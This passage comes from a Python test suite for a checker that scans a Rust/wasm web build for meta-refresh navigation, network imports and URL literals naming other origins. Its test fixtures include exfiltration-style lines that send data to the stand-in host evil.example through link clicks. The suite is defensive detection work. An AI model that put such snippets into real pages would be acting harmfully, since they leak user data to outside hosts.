            "const m = document.createElement('meta'); m.httpEquiv = 'refresh';",
            'm.setAttribute("http-equiv", "refresh");',
            "m.setAttribute('HTTP-EQUIV','Refresh');",
            "Reflect.set(m, 'httpEquiv', v);",
            "document.head.insertAdjacentHTML('beforeend', '<meta http-equiv=refresh content=0>');",
            "export function __wbg_sethttpEquiv_1(a, b) { a.httpEquiv = getStringFromWasm0(b); }",
        ]:
            with self.subTest(line=line):
                self.fx.write("dist/snippets/nav/n.js", line + "\n")
                self.assertFails("n.js:1", "runtime <meta http-equiv>")

    def test_runtime_meta_refresh_in_glue_and_crate_js_fails(self):
        self.fx.write("dist/paste2prompt-web-1.js", GLUE + "m.httpEquiv = 'refresh';\n")
        self.fx.write("crates/web/meta.js", "m.setAttribute('http-equiv', 'refresh');\n")
        self.assertFails("paste2prompt-web-1.js:11", "crates/web/meta.js:1")

    def test_runtime_meta_refresh_in_inline_script_fails(self):
        self.fx.html("<script>document.createElement('meta').httpEquiv = 'refresh';</script>")
        self.fx.headers()
        self.assertFails("runtime <meta http-equiv> (a refresh navigates away): 'httpEquiv' in inline script")

    def test_runtime_meta_refresh_in_rust_fails(self):
        for code in [
            'fn f(m: web_sys::HtmlMetaElement) { m.set_http_equiv("refresh"); }\n',
            'fn f(m: web_sys::Element) { m.set_attribute("http-equiv", "refresh").ok(); }\n',
            'fn f() -> impl IntoView { view! { <meta http-equiv="refresh" content="0"/> } }\n',
            'fn f() -> impl IntoView { view! { <Meta http_equiv="refresh" content="0"/> } }\n',
        ]:
            with self.subTest(code=code):
                self.rust(code)
                self.assertFails("main.rs:7", "runtime <meta http-equiv>")

    def test_runtime_meta_refresh_in_inline_js_fails(self):
        self.rust('#[wasm_bindgen(inline_js = r#"\nexport function r(m) { m.httpEquiv = "refresh"; }\n"#)]\n')
        self.assertFails("runtime <meta http-equiv>", "in inline_js")

    def test_meta_refresh_wasm_import_and_feature_fail(self):
        self.wasm(names=("__wbg_sethttpequiv_9a1b",))
        self.fx.write("crates/web/Cargo.toml", CARGO_TOML + 'web-sys = { features = ["HtmlMetaElement"] }\n')
        self.assertFails("network or navigation API import: wbg.__wbg_sethttpequiv_9a1b",
                         "'\"HtmlMetaElement\"'")

    def test_http_equiv_in_wasm_data_fails(self):
        self.wasm(b"\x00\x01http-equivrefresh\x00")
        self.assertFails("data segment 0", "URL or http-equiv in wasm data: 'http-equivrefresh'")

    def test_refresh_identifiers_pass(self):
        # The word "refresh" alone, and http_equiv as part of a longer name.
        self.fx.write("dist/snippets/nav/n.js", "function refreshCanvas() { const refresh = 1; }\n")
        self.rust("fn refresh_preview() {}\nfn http_equivalent() {}\nconst REFRESH_MS: u32 = 16;\n")
        self.wasm(b"refresh_preview\x00autoRefresh")
        self.assertPasses()

    # External URL literals (href + click)

    def test_external_href_literal_in_rust_fails(self):
        for code in [
            'fn f(a: web_sys::HtmlAnchorElement) { a.set_href("https://evil.example/?d="); a.click(); }\n',
            'fn f(a: &web_sys::Element) { a.set_attribute("href", "http://evil.example").ok(); }\n',
            'const U: &str = "//evil.example/collect";\n',
            'const U: &str = r#"https://evil.example"#;\n',
            'const U: &[u8] = b"HTTPS://evil.example";\n',
            'const U: &str = " https://evil.example";\n',
            'let u = format!("https://evil.example/?d={d}");\n',
            'let x = 1; // "https://evil.example" in a trailing comment still counts\n',
        ]:
            with self.subTest(code=code):
                self.rust(code)
                self.assertFails("main.rs:7", "string literal naming another origin")

    def test_external_href_literal_in_js_fails(self):
        for line in [
            'a.href = "https://evil.example/?d=" + d; a.click();',
            "a.setAttribute('href', '//evil.example/x');",
            "a.href = `https://${host}/?d=${d}`;",
            "const u = 'http:evil.example';",
        ]:
            with self.subTest(line=line):
                self.fx.write("dist/snippets/nav/n.js", line + "\n")
                self.assertFails("n.js:1", "string literal naming another origin")

    def test_external_href_literal_in_inline_js_and_html_script_fails(self):
        self.rust('#[wasm_bindgen(inline_js = "export function g(a) { a.href = \'https://evil.example\'; }")]\n')
        self.fx.html("<script>a.href = '//evil.example';</script>")
        self.fx.headers()
        self.assertFails("in inline_js", "in inline script")

    def test_external_url_in_wasm_data_fails(self):
        for url in [b"https://evil.example/?d=", b"HTTP://evil.example"]:
            with self.subTest(url=url):
                self.wasm(b"some panic message\x00", b"ok" + url + b"\x00tail")
                self.assertFails("data segment 1", "URL or http-equiv in wasm data")

    def test_blob_download_passes(self):
        self.rust(
            "fn download(doc: &web_sys::Document, blob_url: &str) {\n"
            '    let a: web_sys::HtmlAnchorElement = doc.create_element("a").unwrap().unchecked_into();\n'
            "    a.set_href(&blob_url);\n"
            '    a.set_download("paste2prompt.png");\n'
            "    a.click();\n"
            '    let _ = ("blob:", "data:image/png;base64,", "/local/path", "./x.js", "//", "a // b");\n'
            "}\n"
        )
        self.fx.write("dist/snippets/nav/n.js", (
            "a.href = blobUrl; a.download = 'x.png'; a.click();\n"
            "const p = '/paste2prompt-web-1.js', d = \"data:,\", e = '';  // see https://example.com\n"
        ))
        self.assertPasses()

    def test_rust_doc_comment_urls_pass(self):
        # The real build has ``/// ... plain `http:` on another host``.
        self.rust(
            "/// The page isn't a secure context (plain `http:` on another host).\n"
            "/// See https://developer.mozilla.org/ and \"https://example.com\".\n"
            '//! e.g. "//cdn.example/x.js"\n'
            "    // let u = \"https://example.com\";\n"
            "fn f() {}\n"
        )
        self.assertPasses()

    def test_protocol_relative_bytes_in_wasm_data_pass(self):
        self.wasm(b"\x01//g9\x00//xxxxtttt", b"https: is required\x00")
        self.assertPasses()

    def test_unparseable_wasm_data_fails(self):
        good = wasm_with_imports(["__wbindgen_throw"])
        bad = b"\x01\x07" + b"\x00\x99\x00\x0b\x01x" + b"\x00"  # unknown offset opcode
        (self.fx.dist / self.WASM).write_bytes(good + b"\x0b" + _uleb(len(bad)) + bad)
        self.assertFails("cannot parse wasm data section")


if __name__ == "__main__":
    unittest.main(verbosity=1)
